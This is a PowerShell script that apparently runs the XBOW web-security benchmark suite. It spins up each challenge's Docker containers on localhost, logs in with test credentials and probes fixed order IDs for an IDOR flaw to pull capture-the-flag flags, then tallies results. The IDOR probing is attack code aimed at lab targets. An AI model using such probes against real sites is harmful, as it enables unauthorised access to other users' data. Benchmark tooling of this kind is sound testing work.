# XBOW Benchmark Runner v5
$BenchDir = "C:\Users\PC\Desktop\validation-benchmarks\benchmarks"
$Found = 0; $Total = 0; $Results = @()

foreach ($dir in (Get-ChildItem $BenchDir -Directory | Where-Object Name -like "XBEN-*" | Sort-Object Name)) {
    $name = $dir.Name; $flag = $null
    Write-Host "[$name]" -NoNewline

    Push-Location $dir.FullName
    docker compose build --build-arg FLAG=flag_test_2026 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) { Write-Host " FAIL"; Pop-Location; continue }
    docker compose up -d 2>&1 | Out-Null
    Start-Sleep 4

    # Get port
    $port = $null
    for ($i=0; $i -lt 8; $i++) {
        $lines = docker ps --filter "name=$($name.ToLower().Replace('-24',''))" --format "{{.Ports}}" 2>&1
        $first = "$($lines)" -split "`n" | Select-Object -First 1
        $m = [regex]::Match($first, '(\d+)->80')
        if ($m.Success) { $port = [int]$m.Groups[1].Value; break }
        Start-Sleep 2
    }
    if (-not $port) { Write-Host " NOPORT"; docker compose down -v 2>&1 | Out-Null; Pop-Location; continue }
    Write-Host " :$port" -NoNewline

    # Login (using same pattern as working batch file)
    $jar = "$env:TEMP\c.txt"
    curl.exe -s -c $jar -X POST "http://localhost:$port/" -d "username=test" > $null 2>&1
    curl.exe -s -L -b $jar -c $jar -X POST "http://localhost:$port/password/test" -d "username=test&password=test" > $null 2>&1

    # Try IDOR on flag orders
    foreach ($oid in @("300401","300198","300999","301000")) {
        $r = curl.exe -s -b $jar "http://localhost:$port/order/$oid/receipt" 2>&1 | Out-String
        if ($LASTEXITCODE -eq 0 -and $r -match 'flag_') {
            $flag = $Matches[0]; break
        }
        curl.exe -s -b $jar "http://localhost:$port/order/$oid/archive" > $null 2>&1
        $r = curl.exe -s -b $jar "http://localhost:$port/order/$oid/receipt" 2>&1 | Out-String
        if ($LASTEXITCODE -eq 0 -and $r -match 'flag_') {
            $flag = $Matches[0]; break
        }
    }

    # Try /flag
    if (-not $flag) {
        $r = curl.exe -s "http://localhost:$port/flag" 2>&1 | Out-String
        if ($r -match 'flag_[a-zA-Z0-9_{}]+') { $flag = $Matches[0] }
    }

    # Cleanup
    docker compose down -v 2>&1 | Out-Null
    Pop-Location

    if ($flag) { Write-Host " [$flag]" -ForegroundColor Green; $Found++; $Results += [PSCustomObject]@{Name=$name; Flag=$flag} }
    else { Write-Host " [NO]" -ForegroundColor DarkGray }
    $Total++
}

Write-Host "`nOK: $Found / $Total" -ForegroundColor Cyan
$Results | Format-Table -AutoSize
$Results | Export-Csv "$env:USERPROFILE\.aimy\bench_results.csv" -NoTypeInformation
Read-Host "Exit"
